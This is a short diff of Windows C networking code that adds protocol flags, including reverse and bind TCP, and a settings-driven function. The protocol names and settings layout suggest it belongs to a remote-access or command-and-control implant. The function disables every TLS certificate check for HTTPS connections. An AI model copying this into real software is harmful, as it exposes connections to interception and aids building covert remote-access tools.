@@ -2,6 +2,8 @@
 
 #include "network.h"
 
+#include "settings.h"
+
 BOOL gNetworkIsInit = FALSE;
 
 void NetworkInit(void)
@@ -48,4 +50,33 @@ ULONG NetworkGetActiveAdapterIPv4()
 
 	closesocket(sock);
 	return 0;
+}
+
+#define PROTOCOL_HTTP 0
+#define PROTOCOL_DNS 1
+#define PROTOCOL_SMB 2
+#define PROTOCOL_TCP_REVERSE 4
+#define PROTOCOL_HTTPS 8
+#define PROTOCOL_TCP_BIND 16
+
+INTERNET_STATUS_CALLBACK gNetworkStatusCallback;
+void NetworkUpdateSettings(HINTERNET hInternet)
+{
+	if(S_PROTOCOL & PROTOCOL_HTTPS)
+	{
+		int buffer;
+		int length = sizeof(buffer);
+		InternetQueryOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, &length);
+		buffer |= (SECURITY_FLAG_IGNORE_REVOCATION |
+			SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+			SECURITY_FLAG_IGNORE_WRONG_USAGE |
+			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID);
+		InternetSetOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer));
+	}
+
+	if (S_HEADERS_REMOVE)
+	{
+		InternetSetStatusCallback(hInternet, gNetworkStatusCallback);
+	}
 }
